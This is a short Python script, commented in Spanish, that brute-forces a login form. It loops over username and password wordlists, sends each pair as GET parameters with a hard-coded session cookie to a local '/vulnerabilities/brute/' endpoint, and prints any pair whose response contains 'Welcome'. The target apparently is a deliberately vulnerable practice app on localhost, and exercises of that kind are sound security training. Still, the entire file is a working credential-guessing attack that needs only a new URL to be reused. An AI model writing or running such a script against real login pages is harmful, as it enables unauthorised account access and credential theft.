import requests

# Configuracion del objetivo
url = "http://127.0.0.1:8082/vulnerabilities/brute/"
cookies = {"PHPSESSID": "2rpcdj8gr98rj0thcff26m38k7", "security": "low"}

print("[*] Iniciando ataque de fuerza bruta con Python...")

# Leer diccionarios
with open("usuarios.txt", "r") as f:
    usuarios = f.read().splitlines()

with open("contrasenas.txt", "r") as f:
    contrasenas = f.read().splitlines()

# Bucle de ataque
for usuario in usuarios:
    for contrasena in contrasenas:
        parametros = {"username": usuario, "password": contrasena, "Login": "Login"}
        
        # Enviar peticion GET
        respuesta = requests.get(url, params=parametros, cookies=cookies)
        
        # Validar si fue exitoso buscando la palabra clave
        if "Welcome" in respuesta.text:
            print(f"[+] ¡Éxito! Credenciales válidas -> Usuario: {usuario} | Contraseña: {contrasena}")

print("[*] Ataque finalizado.")
